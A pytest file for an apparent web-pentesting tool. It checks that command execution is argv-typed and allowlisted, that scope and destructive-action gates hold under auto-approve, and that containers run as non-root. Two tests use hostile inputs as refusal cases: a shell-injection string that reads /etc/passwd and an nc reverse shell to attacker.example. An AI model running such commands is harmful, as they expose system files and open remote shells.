# tests/test_m2_execution_security.py
"""M2 acceptance — typed execution, allowlists, and the auto-approve boundary.

The registry's M2 scope: "argv-typed execution, allowlists, sandboxing,
non-root · default-deny for state-changing actions; ``--auto-approve``
never bypasses scope/policy/HITL." The column already exists
(``tools/utils/subprocess.py`` chokepoint, ``ActionAuthority``, the HITL
interrupts) — M2 pins it adversarially.
"""

from __future__ import annotations

import inspect
import subprocess
from pathlib import Path

import pytest

from webpent.tools.utils.subprocess import run_command, validate_executable

SRC_ROOT = Path(__file__).resolve().parent.parent / "src" / "webpent"

# ---------------------------------------------------------------------------
# Typed execution — the argv contract
# ---------------------------------------------------------------------------


def test_run_command_refuses_a_shell_string():
    # a str cmd would invoke the shell — the classic injection vector
    with pytest.raises(TypeError, match="list"):
        run_command("httpx -u https://lab.example; cat /etc/passwd")


def test_run_command_refuses_non_string_argv_elements():
    with pytest.raises(TypeError):
        run_command(["httpx", "-timeout", 30])


def test_run_command_refuses_unregistered_executables():
    from webpent.shared.exceptions import ToolExecutionError

    # the chokepoint raises PermissionError; the public run_command surface
    # wraps it as ToolExecutionError — both are typed refusals
    with pytest.raises((ToolExecutionError, PermissionError), match="manifest"):
        run_command(["nc", "-e", "/bin/sh", "attacker.example", "4444"])


def test_executable_allowlist_env_gate(monkeypatch):
    monkeypatch.setenv("WEBPENT_ALLOWED_EXECUTABLES", "bc")
    validate_executable("bc")  # registered via the operator's env
    with pytest.raises(PermissionError):
        validate_executable("telnet")
    validate_executable("nuclei")  # core manifest always available


def test_no_shell_true_anywhere_in_src():
    """AST scan: zero real ``shell=True`` subprocess calls in the tree.

    String examples in remediation templates and docstring mentions are not
    call sites; only an actual ``ast.Call`` keyword ``shell=True`` counts.
    """
    import ast

    offenders: list[str] = []
    for path in SRC_ROOT.rglob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8", errors="replace"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for keyword in node.keywords:
                if (
                    keyword.arg == "shell"
                    and isinstance(keyword.value, ast.Constant)
                    and keyword.value.value is True
                ):
                    offenders.append(
                        f"{path.relative_to(SRC_ROOT)}:{node.lineno}"
                    )
    assert offenders == [], f"real shell=True call sites found: {offenders}"


def test_subprocess_spawn_sites_are_documented_in_the_inventory():
    """Every REAL spawn site (AST-verified) must be in the approved map.

    M2 window note: the map was missing three bounded argv-typed sites
    (production/verdict_bridge.py, memory/ab_lab.py, apex/sandbox.py) —
    they are documented now; a NEW undocumented site fails here.
    """
    import ast

    from webpent.shared.direct_io_inventory import APPROVED_RAW_SYMBOLS_BY_FILE

    approved_files = {
        f.replace("src/webpent/", "")
        for f, symbols in APPROVED_RAW_SYMBOLS_BY_FILE.items()
        if any(s.startswith("subprocess") for s in symbols)
    }
    offenders: list[str] = []
    for path in SRC_ROOT.rglob("*.py"):
        rel = str(path.relative_to(SRC_ROOT))
        tree = ast.parse(path.read_text(encoding="utf-8", errors="replace"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            dotted = ""
            if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
                dotted = f"{func.value.id}.{func.attr}"
            elif isinstance(func, ast.Name):
                dotted = func.id
            if dotted in {
                "subprocess.run",
                "subprocess.Popen",
                "subprocess.check_output",
                "subprocess.check_call",
            } and rel not in approved_files:
                offenders.append(f"{rel}:{node.lineno}")
    assert not offenders, (
        "undocumented subprocess spawn sites — route through "
        f"tools.utils.subprocess.run_command or document in the inventory: {offenders}"
    )


# ---------------------------------------------------------------------------
# Default-deny — auto-approve never bypasses scope/policy
# ---------------------------------------------------------------------------


def _authority(settings_overrides: dict | None = None):
    from webpent.config.settings import get_settings
    from webpent.shared.action_authority import ActionAuthority

    settings = get_settings()
    if settings_overrides:
        settings = settings.model_copy(update=settings_overrides)
    return ActionAuthority(
        settings=settings,
        allowed_origin="https://lab.example",
    )


def test_active_action_denied_without_approval_by_default():
    from webpent.shared.action_authority import ActionRequest, ActionRisk, ActionStatus

    authority = _authority({"smart_auto_approve": False})
    decision = authority.authorize(
        ActionRequest(
            task_id="t1",
            engagement_id="m2",
            target_url="https://lab.example/x",
            method="POST",
            action_family="form_submit",
            risk=ActionRisk.ACTIVE,
            human_approved=False,
        )
    )
    assert decision.status is ActionStatus.POLICY_DENIED
    assert any(r.startswith("approval:") for r in decision.reasons)


def test_smart_auto_approve_cannot_rescue_an_out_of_scope_target():
    from webpent.shared.action_authority import ActionRequest, ActionRisk, ActionStatus

    # the operator's shortcut is an APPROVAL shortcut only — it must never
    # widen the scope boundary (L-2 contract, now pinned against the
    # authority gate itself)
    authority = _authority({"smart_auto_approve": True})
    decision = authority.authorize(
        ActionRequest(
            task_id="t2",
            engagement_id="m2",
            target_url="https://not-authorized.example/x",
            method="GET",
            action_family="http_read",
            risk=ActionRisk.READ_ONLY,
        )
    )
    assert decision.status is ActionStatus.POLICY_DENIED
    assert any("scope" in r for r in decision.reasons)


def test_destructive_actions_are_never_autonomous():
    from webpent.shared.action_authority import ActionRequest, ActionRisk, ActionStatus

    authority = _authority({"smart_auto_approve": True})
    decision = authority.authorize(
        ActionRequest(
            task_id="t3",
            engagement_id="m2",
            target_url="https://lab.example/x",
            method="DELETE",
            action_family="http_read",
            risk=ActionRisk.DESTRUCTIVE,
            human_approved=True,
        )
    )
    assert decision.status is ActionStatus.POLICY_DENIED
    assert any("destructive" in r for r in decision.reasons)


def test_auto_approve_never_removes_the_hitl_interrupts():
    """``--auto-approve`` skips the PAUSE, not the gates.

    The graph built with ``auto_approve=True`` compiles WITHOUT the
    interrupt list (documented CI/CD mode), but the scope/authority gates
    are graph NODES, not interrupts — they run in both builds. This pins
    the L-2 contract at the wiring level: the interrupt list is the ONLY
    difference between the two builds.
    """
    import inspect

    from webpent.graph.builder import build_graph

    source = inspect.getsource(build_graph)
    # the auto-approve branch may only change the interrupt configuration
    assert "interrupt_before" in source
    assert "auto_approve" in source
    # the gate nodes are unconditional additions to the graph
    for gate in ("NODE_SCOPE_ENFORCER", "NODE_WILDCARD_SCOPE"):
        assert gate in source, f"{gate} must be wired unconditionally"


# ---------------------------------------------------------------------------
# Non-root posture (documented deployment invariant)
# ---------------------------------------------------------------------------


def test_containers_declare_a_non_root_runtime():
    """The app image must not RUN as root (M12 pre-check).

    The documented V7 posture: the container starts as root ONLY so
    entrypoint.sh can reconcile bind-mount ownership, then drops to the
    ``webpent`` user via gosu before exec. Accept either a static non-root
    USER directive or the documented gosu drop in the entrypoint.
    """
    repo = SRC_ROOT.parent.parent
    dockerfile = repo / "Dockerfile"
    assert dockerfile.is_file(), "no app Dockerfile found"
    text = dockerfile.read_text(encoding="utf-8", errors="replace")
    static_user = any(
        line.strip().startswith("USER ")
        and line.split()[1].strip() not in {"root", "0"}
        for line in text.splitlines()
    )
    if static_user:
        return
    entrypoint = repo / "entrypoint.sh"
    assert entrypoint.is_file(), "no static USER and no entrypoint.sh"
    entry_text = entrypoint.read_text(encoding="utf-8", errors="replace")
    assert "gosu" in entry_text and "webpent" in entry_text, (
        "the container never drops privileges: no static USER and no "
        "documented gosu drop in entrypoint.sh"
    )
